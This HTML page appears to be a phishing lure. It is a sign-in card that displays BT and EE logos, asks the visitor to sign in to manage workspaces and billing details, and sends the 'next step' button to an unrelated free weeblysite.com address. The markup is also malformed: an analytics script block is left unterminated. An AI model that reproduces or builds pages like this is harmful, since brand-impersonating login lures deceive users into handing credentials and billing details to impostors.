<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Centered Card</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script><!-- aura-ga4-start -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2M6V79H761"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

<body class="bg-zinc-50 min-h-screen flex items-center justify-center p-4 font-['Inter',sans-serif] antialiased">

    <!-- Card Container -->
    <main class="w-full max-w-[420px] bg-white rounded-[24px] shadow-[0_20px_40px_-15px_rgba(0,0,0,0.05)] border border-zinc-100/80 overflow-hidden">
        
        <!-- Dark Banner -->
        <div class="h-28 bg-zinc-950 relative w-full">
            <!-- Subtle gradient overlay for depth -->
            <div class="absolute inset-0 bg-gradient-to-tr from-zinc-900 to-transparent opacity-80"></div>
        </div>

        <!-- Content Section -->
        <div class="px-8 pb-8 flex flex-col items-center relative">
            
            <!-- Overlapping Circular Logo -->
            <div class="w-20 h-20 -mt-10 rounded-full border-[4px] border-white bg-white flex items-center justify-center shadow-sm relative z-10 overflow-hidden p-1.5">
                <img 
                    src="https://hoirqrkdgbmvpwutwuwj.supabase.co/storage/v1/object/public/assets/assets/7975c983-53d7-48d9-b45c-6eeafc9c9d4e_320w.png" 
                    alt="BT and EE Partnership Logos" 
                    class="w-full h-full object-contain"
                >
            </div>

            <!-- Text Content -->
            <h1 class="mt-5 text-2xl font-semibold tracking-tight text-zinc-900 text-center">
                Welcome back
            </h1>
            
            <p class="mt-2 text-sm text-zinc-500 text-center leading-relaxed">
                Sign in to your account to continue managing your workspaces and billing details.
            </p>

            <!-- Full Width Button -->
            <a href="https://my-site-101516-101798.weeblysite.com/" target="_blank" rel="noopener noreferrer" class="mt-8 w-full bg-zinc-900 hover:bg-zinc-800 text-white rounded-xl py-3 px-4 flex items-center justify-center gap-2 text-sm font-medium transition-all duration-200 ease-in-out focus:outline-none focus:ring-2 focus:ring-zinc-900 focus:ring-offset-2 active:scale-[0.98]">
                <span>Click here for the next step</span>
                <iconify-icon icon="solar:arrow-right-linear" class="text-base" style="stroke-width: 1.5;"></iconify-icon>
            </a>

        </div>
    </main>

</body>
</html>
